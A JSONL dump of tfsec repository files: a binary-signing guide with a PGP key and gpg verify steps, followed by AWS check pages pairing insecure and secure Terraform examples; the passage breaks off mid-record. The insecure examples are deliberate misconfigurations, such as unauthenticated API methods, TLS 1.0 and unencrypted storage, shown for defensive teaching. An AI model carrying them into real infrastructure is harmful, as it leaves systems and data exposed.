{"source": "github", "repo": "aquasecurity/tfsec", "file": "SIGNING.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/SIGNING.md", "content": "# Signing\n\nAll tfsec binaries are signed with out signing key `D66B222A3EA4C25D5D1A097FC34ACEFB46EC39CE`. The steps below detail how to verify the signature of the keys.\n\n\n## Public Key\n\n```\n-----BEGIN PGP PUBLIC KEY BLOCK-----\n\n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\nnX5QmAEwF/nBYV3Du7TIvHtz91yL8A==\n=opqY\n-----END PGP PUBLIC KEY BLOCK-----\n```\n\n## Verifying Binary\n\n### Import Key\n\n1. Copy the public key block into a new file, eg; /tmp/tfsec_key.txt\n   \n2. Import the gpg key\n   ```\n    gpg --import < /tmp/tfsec_key.txt\n   ```\n3. Verify that the key has been imported\n    ```\n    gpg --list-keys signing@tfsec.dev\n    ```\n    check the output is\n    ```\n    pub  rsa4096 2021-05-20 [SC]       D66B222A3EA4C25D5D1A097FC34ACEFB46EC39CE\n    uid  [ultimate] Tfsec Signing (Code signing for tfsec) <signing@tfsec.dev>\n    sub  rsa4096 2021-05-20 [E]\n    ```\n4. Download the required binary and its associated sig file\n   \n5. Assuming it is `tfsec-linux-amd64` the verify command below should be run, passing in the sig file then the binary file\n   ```\n   gpg --verify tfsec-linux-amd64.D66B222A3EA4C25D5D1A097FC34ACEFB46EC39CE.sig tfsec-linux-amd64\n   ```\n   This should give you a similar output to that below - the key part is that it is signed and has a `Good signature`\n   ```\n   gpg: Signature made Fri 09 Jul 2021 11:41:22 BST\n   gpg:                using RSA key D66B222A3EA4C25D5D1A097FC34ACEFB46EC39CE\n   gpg: Good signature from \"Tfsec Signing (Code signing for tfsec) <signing@tfsec.dev>\" [ultimate]\n\n   ```", "timestamp": "2025-10-24T11:40:10.824015"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/api-gateway/enable-access-logging/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/api-gateway/enable-access-logging/index.md", "content": "---\ntitle: API Gateway stages for V1 and V2 should have access logging enabled\n---\n\n# API Gateway stages for V1 and V2 should have access logging enabled\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nAPI Gateway stages should have access log settings block configured to track all access to a particular stage. This should be applied to both v1 and v2 gateway stages.\n\n### Possible Impact\nLogging provides vital information about access and usage\n\n### Suggested Resolution\nEnable logging for API Gateway stages\n\n\n### Insecure Example\n\nThe following example will fail the aws-api-gateway-enable-access-logging check.\n```terraform\n\n resource \"aws_apigatewayv2_stage\" \"bad_example\" {\n   api_id = aws_apigatewayv2_api.example.id\n   name   = \"example-stage\"\n }\n \n resource \"aws_apigatewayv2_stage\" \"bad_example\" {\n   deployment_id = aws_api_gateway_deployment.example.id\n   rest_api_id   = aws_api_gateway_rest_api.example.id\n   stage_name    = \"example\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-api-gateway-enable-access-logging check.\n```terraform\n\n resource \"aws_apigatewayv2_stage\" \"good_example\" {\n   api_id = aws_apigatewayv2_api.example.id\n   name   = \"example-stage\"\n \n   access_log_settings {\n    destination_arn = \"arn:aws:logs:region:0123456789:log-group:access_logging\"\n    format          = \"json\"\n   }\n }\n \n resource \"aws_api_gateway_stage\" \"good_example\" {\n   deployment_id = aws_api_gateway_deployment.example.id\n   rest_api_id   = aws_api_gateway_rest_api.example.id\n   stage_name    = \"example\"\n \n   access_log_settings {\n     destination_arn = \"arn:aws:logs:region:0123456789:log-group:access_logging\"\n     format          = \"json\"\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/apigatewayv2_stage#access_log_settings](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/apigatewayv2_stage#access_log_settings){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/apigateway/latest/developerguide/set-up-logging.html](https://docs.aws.amazon.com/apigateway/latest/developerguide/set-up-logging.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:46.178212"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/api-gateway/enable-cache-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/api-gateway/enable-cache-encryption/index.md", "content": "---\ntitle: API Gateway must have cache enabled\n---\n\n# API Gateway must have cache enabled\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nMethod cache encryption ensures that any sensitive data in the cache is not vulnerable to compromise in the event of interception\n\n### Possible Impact\nData stored in the cache that is unencrypted may be vulnerable to compromise\n\n### Suggested Resolution\nEnable cache encryption\n\n\n### Insecure Example\n\nThe following example will fail the aws-api-gateway-enable-cache-encryption check.\n```terraform\n\n resource \"aws_api_gateway_rest_api\" \"example\" {\n\t\n }\n\n resource \"aws_api_gateway_stage\" \"example\" {\n\trest_api_id = aws_api_gateway_rest_api.example.id\n }\n\n resource \"aws_api_gateway_method_settings\" \"bad_example\" {\n   rest_api_id = aws_api_gateway_rest_api.example.id\n   stage_name  = aws_api_gateway_stage.example.stage_name\n   method_path = \"path1/GET\"\n \n   settings {\n     metrics_enabled = true\n     logging_level   = \"INFO\"\n     caching_enabled = true\n     cache_data_encrypted = false\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-api-gateway-enable-cache-encryption check.\n```terraform\n\n resource \"aws_api_gateway_rest_api\" \"example\" {\n\t\n }\n\n resource \"aws_api_gateway_stage\" \"example\" {\n\n }\n\n resource \"aws_api_gateway_method_settings\" \"good_example\" {\n   rest_api_id = aws_api_gateway_rest_api.example.id\n   stage_name  = aws_api_gateway_stage.example.stage_name\n   method_path = \"path1/GET\"\n \n   settings {\n     metrics_enabled = true\n     logging_level   = \"INFO\"\n     caching_enabled = true\n     cache_data_encrypted = true\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_method_settings#cache_data_encrypted](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_method_settings#cache_data_encrypted){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:46.445380"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/api-gateway/enable-tracing/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/api-gateway/enable-tracing/index.md", "content": "---\ntitle: API Gateway must have X-Ray tracing enabled\n---\n\n# API Gateway must have X-Ray tracing enabled\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nX-Ray tracing enables end-to-end debugging and analysis of all API Gateway HTTP requests.\n\n### Possible Impact\nWithout full tracing enabled it is difficult to trace the flow of logs\n\n### Suggested Resolution\nEnable tracing\n\n\n### Insecure Example\n\nThe following example will fail the aws-api-gateway-enable-tracing check.\n```terraform\n\n resource \"aws_api_gateway_rest_api\" \"test\" {\n\t\n }\n\n resource \"aws_api_gateway_stage\" \"bad_example\" {\n   stage_name    = \"prod\"\n   rest_api_id   = aws_api_gateway_rest_api.test.id\n   deployment_id = aws_api_gateway_deployment.test.id\n   xray_tracing_enabled = false\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-api-gateway-enable-tracing check.\n```terraform\n\n resource \"aws_api_gateway_rest_api\" \"test\" {\n\t\n }\n\n resource \"aws_api_gateway_stage\" \"good_example\" {\n   stage_name    = \"prod\"\n   rest_api_id   = aws_api_gateway_rest_api.test.id\n   deployment_id = aws_api_gateway_deployment.test.id\n   xray_tracing_enabled = true\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_stage#xray_tracing_enabled](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_stage#xray_tracing_enabled){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:46.776557"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/api-gateway/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/api-gateway/index.md", "content": "---\ntitle: api-gateway\n---\n\n# api-gateway\n\n## Checks\n\n\n- [enable-access-logging](enable-access-logging) API Gateway stages for V1 and V2 should have access logging enabled\n\n- [enable-cache-encryption](enable-cache-encryption) API Gateway must have cache enabled\n\n- [enable-tracing](enable-tracing) API Gateway must have X-Ray tracing enabled\n\n- [no-public-access](no-public-access) No unauthorized access to API Gateway methods\n\n- [use-secure-tls-policy](use-secure-tls-policy) API Gateway domain name uses outdated SSL/TLS protocols.\n\n\n\n", "timestamp": "2025-10-24T22:23:46.880830"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/api-gateway/no-public-access/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/api-gateway/no-public-access/index.md", "content": "---\ntitle: No unauthorized access to API Gateway methods\n---\n\n# No unauthorized access to API Gateway methods\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nAPI Gateway methods should generally be protected by authorization or api key. OPTION verb calls can be used without authorization\n\n### Possible Impact\nAPI gateway methods can be accessed without authorization.\n\n### Suggested Resolution\nUse and authorization method or require API Key\n\n\n### Insecure Example\n\nThe following example will fail the aws-api-gateway-no-public-access check.\n```terraform\n\n resource \"aws_api_gateway_rest_api\" \"MyDemoAPI\" {\n\t\n }\n\n resource \"aws_api_gateway_resource\" \"MyDemoResource\" {\n\trest_api_id      = aws_api_gateway_rest_api.MyDemoAPI.id\n }\n\n resource \"aws_api_gateway_method\" \"bad_example\" {\n   rest_api_id   = aws_api_gateway_rest_api.MyDemoAPI.id\n   resource_id   = aws_api_gateway_resource.MyDemoResource.id\n   http_method   = \"GET\"\n   authorization = \"NONE\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-api-gateway-no-public-access check.\n```terraform\n\n resource \"aws_api_gateway_rest_api\" \"MyDemoAPI\" {\n\t\n }\n\n resource \"aws_api_gateway_resource\" \"MyDemoResource\" {\n\trest_api_id      = aws_api_gateway_rest_api.MyDemoAPI.id\n }\n\n resource \"aws_api_gateway_method\" \"good_example\" {\n   rest_api_id   = aws_api_gateway_rest_api.MyDemoAPI.id\n   resource_id   = aws_api_gateway_resource.MyDemoResource.id\n   http_method   = \"GET\"\n   authorization = \"AWS_IAM\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_method#authorization](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_method#authorization){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:47.178368"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/api-gateway/use-secure-tls-policy/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/api-gateway/use-secure-tls-policy/index.md", "content": "---\ntitle: API Gateway domain name uses outdated SSL/TLS protocols.\n---\n\n# API Gateway domain name uses outdated SSL/TLS protocols.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nYou should not use outdated/insecure TLS versions for encryption. You should be using TLS v1.2+.\n\n### Possible Impact\nOutdated SSL policies increase exposure to known vulnerabilities\n\n### Suggested Resolution\nUse the most modern TLS/SSL policies available\n\n\n### Insecure Example\n\nThe following example will fail the aws-api-gateway-use-secure-tls-policy check.\n```terraform\n\n resource \"aws_api_gateway_domain_name\" \"bad_example\" {\n \tsecurity_policy = \"TLS_1_0\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-api-gateway-use-secure-tls-policy check.\n```terraform\n\n resource \"aws_api_gateway_domain_name\" \"good_example\" {\n \tsecurity_policy = \"TLS_1_2\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_domain_name#security_policy](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_domain_name#security_policy){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-custom-domain-tls-version.html](https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-custom-domain-tls-version.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:47.446380"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/athena/enable-at-rest-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/athena/enable-at-rest-encryption/index.md", "content": "---\ntitle: Athena databases and workgroup configurations are created unencrypted at rest by default, they should be encrypted\n---\n\n# Athena databases and workgroup configurations are created unencrypted at rest by default, they should be encrypted\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nAthena databases and workspace result sets should be encrypted at rests. These databases and query sets are generally derived from data in S3 buckets and should have the same level of at rest protection.\n\n### Possible Impact\nData can be read if the Athena Database is compromised\n\n### Suggested Resolution\nEnable encryption at rest for Athena databases and workgroup configurations\n\n\n### Insecure Example\n\nThe following example will fail the aws-athena-enable-at-rest-encryption check.\n```terraform\n\n resource \"aws_athena_database\" \"bad_example\" {\n   name   = \"database_name\"\n   bucket = aws_s3_bucket.hoge.bucket\n }\n \n resource \"aws_athena_workgroup\" \"bad_example\" {\n   name = \"example\"\n \n   configuration {\n     enforce_workgroup_configuration    = true\n     publish_cloudwatch_metrics_enabled = true\n \n     result_configuration {\n       output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n     }\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-athena-enable-at-rest-encryption check.\n```terraform\n\n resource \"aws_athena_database\" \"good_example\" {\n   name   = \"database_name\"\n   bucket = aws_s3_bucket.hoge.bucket\n \n   encryption_configuration {\n      encryption_option = \"SSE_KMS\"\n      kms_key_arn       = aws_kms_key.example.arn\n  }\n }\n \n resource \"aws_athena_workgroup\" \"good_example\" {\n   name = \"example\"\n \n   configuration {\n     enforce_workgroup_configuration    = true\n     publish_cloudwatch_metrics_enabled = true\n \n     result_configuration {\n       output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n \n       encryption_configuration {\n         encryption_option = \"SSE_KMS\"\n         kms_key_arn       = aws_kms_key.example.arn\n       }\n     }\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/athena_workgroup#encryption_configuration](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/athena_workgroup#encryption_configuration){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/athena_database#encryption_configuration](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/athena_database#encryption_configuration){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/athena/latest/ug/encryption.html](https://docs.aws.amazon.com/athena/latest/ug/encryption.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:47.922570"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/athena/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/athena/index.md", "content": "---\ntitle: athena\n---\n\n# athena\n\n## Checks\n\n\n- [enable-at-rest-encryption](enable-at-rest-encryption) Athena databases and workgroup configurations are created unencrypted at rest by default, they should be encrypted\n\n- [no-encryption-override](no-encryption-override) Athena workgroups should enforce configuration to prevent client disabling encryption\n\n\n\n", "timestamp": "2025-10-24T22:23:48.044180"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/athena/no-encryption-override/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/athena/no-encryption-override/index.md", "content": "---\ntitle: Athena workgroups should enforce configuration to prevent client disabling encryption\n---\n\n# Athena workgroups should enforce configuration to prevent client disabling encryption\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nAthena workgroup configuration should be enforced to prevent client side changes to disable encryption settings.\n\n### Possible Impact\nClients can ignore encryption requirements\n\n### Suggested Resolution\nEnforce the configuration to prevent client overrides\n\n\n### Insecure Example\n\nThe following example will fail the aws-athena-no-encryption-override check.\n```terraform\n\n resource \"aws_athena_workgroup\" \"bad_example\" {\n   name = \"example\"\n \n   configuration {\n     enforce_workgroup_configuration    = false\n     publish_cloudwatch_metrics_enabled = true\n \n     result_configuration {\n       output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n \n       encryption_configuration {\n         encryption_option = \"SSE_KMS\"\n         kms_key_arn       = aws_kms_key.example.arn\n       }\n     }\n   }\n }\n \n resource \"aws_athena_workgroup\" \"bad_example\" {\n   name = \"example\"\n \n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-athena-no-encryption-override check.\n```terraform\n\n resource \"aws_athena_workgroup\" \"good_example\" {\n   name = \"example\"\n \n   configuration {\n     enforce_workgroup_configuration    = true\n     publish_cloudwatch_metrics_enabled = true\n \n     result_configuration {\n       output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n \n       encryption_configuration {\n         encryption_option = \"SSE_KMS\"\n         kms_key_arn       = aws_kms_key.example.arn\n       }\n     }\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/athena_workgroup#configuration](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/athena_workgroup#configuration){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/athena/latest/ug/manage-queries-control-costs-with-workgroups.html](https://docs.aws.amazon.com/athena/latest/ug/manage-queries-control-costs-with-workgroups.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:48.335759"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/autoscaling/enable-at-rest-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/autoscaling/enable-at-rest-encryption/index.md", "content": "---\ntitle: Launch configuration with unencrypted block device.\n---\n\n# Launch configuration with unencrypted block device.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nBlock devices should be encrypted to ensure sensitive data is held securely at rest.\n\n### Possible Impact\nThe block device could be compromised and read from\n\n### Suggested Resolution\nTurn on encryption for all block devices\n\n\n### Insecure Example\n\nThe following example will fail the aws-autoscaling-enable-at-rest-encryption check.\n```terraform\n\n resource \"aws_launch_configuration\" \"bad_example\" {\n \troot_block_device {\n \t\tencrypted = false\n \t}\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-autoscaling-enable-at-rest-encryption check.\n```terraform\n\n resource \"aws_launch_configuration\" \"good_example\" {\n \troot_block_device {\n \t\tencrypted = true\n \t}\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#ebs-ephemeral-and-root-block-devices](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#ebs-ephemeral-and-root-block-devices){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/RootDeviceStorage.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/RootDeviceStorage.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:48.899187"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/autoscaling/enforce-http-token-imds/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/autoscaling/enforce-http-token-imds/index.md", "content": "---\ntitle: aws_instance should activate session tokens for Instance Metadata Service.\n---\n\n# aws_instance should activate session tokens for Instance Metadata Service.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\n\nIMDS v2 (Instance Metadata Service) introduced session authentication tokens which improve security when talking to IMDS.\nBy default <code>aws_instance</code> resource sets IMDS session auth tokens to be optional. \nTo fully protect IMDS you need to enable session tokens by using <code>metadata_options</code> block and its <code>http_tokens</code> variable set to <code>required</code>.\n\n\n### Possible Impact\nInstance metadata service can be interacted with freely\n\n### Suggested Resolution\nEnable HTTP token requirement for IMDS\n\n\n### Insecure Example\n\nThe following example will fail the aws-autoscaling-enforce-http-token-imds check.\n```terraform\n\n resource \"aws_launch_template\" \"bad_example\" {\n\t image_id      = \"ami-005e54dee72cc1d00\"\n\t instance_type = \"t2.micro\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-autoscaling-enforce-http-token-imds check.\n```terraform\n\n resource \"aws_launch_template\" \"good_example\" {\n\t image_id      = \"ami-005e54dee72cc1d00\"\n\t instance_type = \"t2.micro\"\n\t metadata_options {\n\t   http_tokens = \"required\"\n\t }\t\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#metadata-options](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#metadata-options){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:49.184559"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/autoscaling/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/autoscaling/index.md", "content": "---\ntitle: autoscaling\n---\n\n# autoscaling\n\n## Checks\n\n\n- [enable-at-rest-encryption](enable-at-rest-encryption) Launch configuration with unencrypted block device.\n\n- [enforce-http-token-imds](enforce-http-token-imds) aws_instance should activate session tokens for Instance Metadata Service.\n\n- [no-public-ip](no-public-ip) Launch configuration should not have a public IP address.\n\n- [no-secrets-in-user-data](no-secrets-in-user-data) User data for EC2 instances must not contain sensitive AWS keys\n\n- [no-sensitive-info](no-sensitive-info) Ensure all data stored in the launch configuration EBS is securely encrypted\n\n\n\n", "timestamp": "2025-10-24T22:23:49.312154"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/autoscaling/no-public-ip/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/autoscaling/no-public-ip/index.md", "content": "---\ntitle: Launch configuration should not have a public IP address.\n---\n\n# Launch configuration should not have a public IP address.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nYou should limit the provision of public IP addresses for resources. Resources should not be exposed on the public internet, but should have access limited to consumers required for the function of your application.\n\n### Possible Impact\nThe instance or configuration is publicly accessible\n\n### Suggested Resolution\nSet the instance to not be publicly accessible\n\n\n### Insecure Example\n\nThe following example will fail the aws-autoscaling-no-public-ip check.\n```terraform\n\n resource \"aws_launch_configuration\" \"bad_example\" {\n \tassociate_public_ip_address = true\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-autoscaling-no-public-ip check.\n```terraform\n\n resource \"aws_launch_configuration\" \"good_example\" {\n \tassociate_public_ip_address = false\n }\n \n```\n\n\n\n### Links\n\n\n- 